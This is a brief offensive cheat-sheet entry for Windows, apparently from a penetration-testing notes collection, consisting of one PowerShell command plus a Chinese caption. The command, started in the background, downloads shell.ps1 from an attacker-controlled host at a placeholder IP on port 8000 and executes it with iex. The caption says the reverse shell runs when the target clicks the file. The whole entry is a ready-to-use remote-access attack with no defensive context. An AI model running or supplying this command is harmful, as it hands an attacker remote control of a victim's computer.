---
os: windows
service: Reverse shell
---
```
START /B powershell -c "$code=(New-Object System.Net.Webclient).DownloadString('http://IP:8000/shell.ps1');iex $code"
```
目标点击文件后，powershell从攻击机下载并运行reverse shell